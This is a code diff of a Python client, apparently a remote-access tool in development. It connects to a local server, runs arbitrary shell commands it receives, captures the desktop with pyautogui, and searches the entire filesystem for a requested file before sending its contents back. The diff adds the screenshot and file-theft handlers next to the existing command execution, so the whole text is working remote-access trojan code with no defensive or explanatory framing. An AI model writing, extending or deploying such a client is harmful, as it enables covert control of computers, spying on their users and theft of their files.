@@ -4,20 +4,7 @@ import subprocess
 import struct
 import pyautogui
 import io
-
-
-def execute_command(command):
-    """Execute a system command and return its output or error."""
-    try:
-        # Run the command and capture output
-        result = subprocess.run(command, shell=True, capture_output=True, text=True, encoding='utf-8', errors='replace')
-        output = result.stdout if result.stdout else ""
-        error = result.stderr if result.stderr else ""
-        return output + error
-    except Exception as e:
-        return f"Error: {str(e)}"
-
-
+import os
 
 def receive_all(sock, size):
     data = b''
@@ -29,26 +16,92 @@ def receive_all(sock, size):
     return data
 
 
+#command
+def execute_command(command):
+    """Execute a system command and return its output or error."""
+    try:
+        result = subprocess.run(command, shell=True, capture_output=True, text=True, encoding='utf-8', errors='replace')
+        output = result.stdout if result.stdout else ""
+        error = result.stderr if result.stderr else ""
+        return output + error
+    except Exception as e:
+        return f"Error: {str(e)}"
 
-def get_screenshot():
+
+def handle_command(request):
+    return execute_command(request["command"])
+
+#screenshot
+def send_screenshot():
     screenshot = pyautogui.screenshot()
     img_bytes = io.BytesIO()
     screenshot.save(img_bytes, format='PNG')
-    img_data = img_bytes.getvalue()
-    return img_data
+    return img_bytes.getvalue()
+
+def handle_screenshot(request):
+    return send_screenshot()
+
+#file
+def send_file_(request):
+    file_name = request.get("file_name")
+    if not file_name:
+        return b"Error: no file_name provided"
+
+    def search_file(start_path):
+        for root, dirs, files in os.walk(start_path, topdown=True):
+            # Skip folders that raise permission errors
+            try:
+                dirs[:] = [d for d in dirs]  # force walk to stay in place
+            except Exception:
+                continue
+            if file_name in files:
+                full_path = os.path.join(root, file_name)
+                print(f"[CLIENT] Found file at: {full_path}")
+                try:
+                    with open(full_path, "rb") as f:
+                        return f.read()
+                except Exception as e:
+                    return f"Error reading file: {e}".encode("utf-8")
+        return None  # not found
+
+    # Try C:\ (for Windows)
+    data = search_file("C:\\")
+    if data:
+        return data
+
+    # Try / (for Linux or alternate roots)
+    data = search_file("/")
+    if data:
+        return data
+
+    # If not found at all
+    return b"File not found"
+
+
+def handle_file_request(request):
+    return send_file_(request)
+
+actions = {
+    "command": {
+        "handler": handle_command
+    },
+    "screenshot": {
+        "handler": handle_screenshot
+    },
+    "file": {
+        "handler": handle_file_request
+    }
+}
 
 
 def main():
-    # Create a TCP client socket
     client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
     try:
-        # Connect to the server
         client_socket.connect(("127.0.0.1", 2000))
         print("Connected to server at 127.0.0.1:2000")
 
         while True:
-            # Receive the command from the server
             length_bytes = receive_all(client_socket, 4)
             if not length_bytes:
                 print("Server closed connection.")
@@ -58,32 +111,34 @@ def main():
             request_bytes = receive_all(client_socket, length)
             request_str = request_bytes.decode('utf-8')
 
-
             if not request_str:
                 print("No command received or server disconnected.")
                 break
+
             print(f"Received command: {request_str}")
             request = json.loads(request_str)
 
-            # Execute the command
-            result = execute_command(request["command"])
-            print(f"Command output: {result}")
+            action_type = request.get("type")
 
-            # Encode the result to UTF-8 bytes BEFORE getting the length
-            encoded_result = result.encode('utf-8')
+            if action_type in actions:
+                result = actions[action_type]["handler"](request)
+            else:
+                result = "Unknown action type"
+
+            # Encode string to bytes if needed
+            if isinstance(result, str):
+                encoded_result = result.encode('utf-8')
+            else:
+                encoded_result = result
+
             print(f"Encoded byte length: {len(encoded_result)}")
-
-            # Send the result with correct byte length
             size = struct.pack(">I", len(encoded_result))
             client_socket.sendall(size + encoded_result)
             print("Result sent to server.")
 
-
-
     except Exception as e:
         print(f"Error: {e}")
     finally:
-        # Close the client socket
         client_socket.close()
         print("Client socket closed.")
 
